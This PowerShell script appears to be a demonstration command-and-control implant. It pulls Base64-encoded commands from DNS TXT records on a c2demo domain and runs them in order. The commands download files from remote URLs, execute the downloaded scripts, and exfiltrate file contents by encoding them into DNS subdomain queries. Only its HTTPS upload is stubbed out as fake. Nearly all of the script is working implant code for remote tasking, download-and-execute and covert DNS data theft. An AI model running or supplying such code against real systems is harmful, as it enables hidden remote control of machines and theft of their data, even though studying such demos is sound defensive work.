PARAM (
    [string] $dnsName = "c2demo.ronnkvist.nu",
    [string] $demoC2DnsServer
)

Write-Host "Using DNS TXT-records from: $($dnsName)"
Write-Host ""

# DNS Lookup
$dnsLookup = Resolve-DnsName $dnsName -Type TXT -Server "ns1.simply.com"
Write-Host "TXT Strings Found:"
$dnsLookup.Strings | ForEach-Object {
    Write-Host "   $($_)"
}

# Decode TXT strings from Base64
Write-Host ""
$c2Commands = @()

Write-Host "Base64 Decoded TXT Strings:"
$dnsLookup.Strings | ForEach-Object {
    $decoded = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($_))
    Write-Host "   $($decoded)"

    $cmd = $decoded.Split(";")
    $c2Command = New-Object System.Object

    $c2Command | Add-Member -MemberType NoteProperty -Name Origin    -Force -Value $cmd[0]
    $c2Command | Add-Member -MemberType NoteProperty -Name Number    -Force -Value $cmd[1]
    $c2Command | Add-Member -MemberType NoteProperty -Name Command   -Force -Value $cmd[2]
    $c2Command | Add-Member -MemberType NoteProperty -Name Parameter -Force -Value $cmd[3]

    $c2Commands += $c2Command
}

# Sort commands by "Number"
$c2Commands = $c2Commands | Sort-Object Number

Write-Host ""
Write-Host "Commands:"
$c2Commands | Format-Table * -AutoSize

# Run commands
Write-Host ""
Write-Host "Running commands:"

$tempDir = (Get-Item ENV:Temp).Value
$c2Server = "unknown"
foreach ($c2 in $c2Commands) {
    Switch ($c2.Command) {
        "Write" {
                    Write-Host "Write: " -ForegroundColor Yellow -NoNewline
                    Write-Host "$($c2.Parameter)"
                }

        "Get"   {
                    Write-Host "Download file from remote host: " -ForegroundColor Yellow
                    Write-Host "  Remote: $($c2.Parameter)"
                    
                    $s = $c2.Parameter.Split("/")
                    $OutFile = Join-Path $tempDir $s[$s.Count - 1]
                    Write-Host "    File: $($OutFile)"

                    Invoke-WebRequest -Uri $c2.Parameter -OutFile $OutFile
                }


        "PS"   {
                    Write-Host "Run Script: " -ForegroundColor Yellow -NoNewline
                    Write-Host $c2.Parameter
                   
                    $scriptToRun = Join-Path $tempDir $c2.Parameter
                    Write-Host $scriptToRun

                    Write-Host "----------------------------------------------------------" -ForegroundColor Gray
                    & $scriptToRun
                    Write-Host "----------------------------------------------------------" -ForegroundColor Gray
                }

        "Set"   {
                    Write-Host "Set C2 Server: " -ForegroundColor Yellow -NoNewline
                    Write-Host $c2.Parameter
                    $c2Server = $c2.Parameter
                }

        "https"  {
                    Write-Host "Upload file to https C2 Server" -ForegroundColor Yellow
                    Write-Host "    File: $(Join-Path $tempDir $c2.Parameter)"
                    Write-Host "  Server: https://$($c2Server)"
                    Write-Host "          ... well this is just a fake upload ;)" -ForegroundColor DarkGray
                }

        "DNS"  {
                    Write-Host "Upload file via DNS queries" -ForegroundColor Yellow
                    Write-Host "    File: $(Join-Path $tempDir $c2.Parameter)"

                    $fileContent = (Get-Content (Join-Path $tempDir $c2.Parameter)).Trim()
                    Write-Host " Content: $($fileContent)"
                    
                    [string]$encodedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileContent))
                    Write-Host "  Base64: $($encodedContent)"

                    $dnsOkContent = $encodedContent.Replace("=", "-").Replace("+", "_")
                    Write-Host "  DNS OK: $($dnsOkContent)"

                    Write-Host "   Query: $($dnsOkContent).$($dnsName)"

                    if ($demoC2DnsServer) {
                        Write-Host "  Server: $($demoC2DnsServer)"
                        Resolve-DnsName "$($dnsOkContent).$($dnsName)" -Server $demoC2DnsServer -ErrorAction SilentlyContinue
                    } else {
                        Resolve-DnsName "$($dnsOkContent).$($dnsName)" -ErrorAction SilentlyContinue
                    }
                    
                }

        default {
                    Write-Host "Unknown: " -ForegroundColor Red -NoNewline
                    Write-Host $c2.Command
                }
    }

    Write-Host ""
}
